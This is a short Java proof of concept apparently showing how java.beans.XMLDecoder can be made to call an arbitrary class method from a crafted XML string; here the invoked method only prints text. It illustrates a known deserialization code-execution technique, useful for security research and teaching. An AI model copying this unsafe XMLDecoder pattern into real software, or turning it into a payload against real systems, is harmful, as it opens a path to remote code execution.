package com.company;

import java.beans.XMLDecoder;
import java.io.ByteArrayInputStream;
import java.io.IOException;

public class PocUsingBytes_Method_Invoke_Current_Class
{
    public String test2(String value)
    {
        System.out.println(value);
        return "ok";
    }
    public static String test(String value)
    {
        System.out.println(value);
        return "ok";
    }
    public static void main(String[] args) throws IOException
    {
        String className  = "com.company.PocUsingBytes";
        String methodName = "test";
        String firstParam = "From XML Decoder";

        test("From Java code");

        String xmlPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<java version=\"1.7.0_17\" class=\"java.beans.XMLDecoder\">  " +
                "<object class=\"" + className + "\">     " +
                "<void method=\""+ methodName + "\">                " +
                "<string>" + firstParam + "</string>   " +
                "</void>  " +
                "</object>" +
                "</java>";
        ExecutefromXml(xmlPayload);
        ExecuteMethodInClass(className, methodName, firstParam);
    }
    public static void ExecutefromXml(String xmlPayload)
    {
        byte[] bytes = xmlPayload.getBytes();
        ByteArrayInputStream inputStream = new ByteArrayInputStream(bytes);
        XMLDecoder xmlDecoder = new XMLDecoder(inputStream);
        xmlDecoder.readObject();
    }
    public static void ExecuteMethodInClass(String className, String methodName, String firstParam)
    {
        String xmlPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<java version=\"1.7.0_17\" class=\"java.beans.XMLDecoder\">  " +
                "<object class=\"" + className + "\">     " +
                "<void method=\""+ methodName + "\">                " +
                    "<string>" + firstParam + "</string>   " +
                "</void>  " +
                "</object>" +
                "</java>";

        byte[] bytes = xmlPayload.getBytes();
        ByteArrayInputStream inputStream = new ByteArrayInputStream(bytes);
        XMLDecoder xmlDecoder = new XMLDecoder(inputStream);
        xmlDecoder.readObject();
    }
}
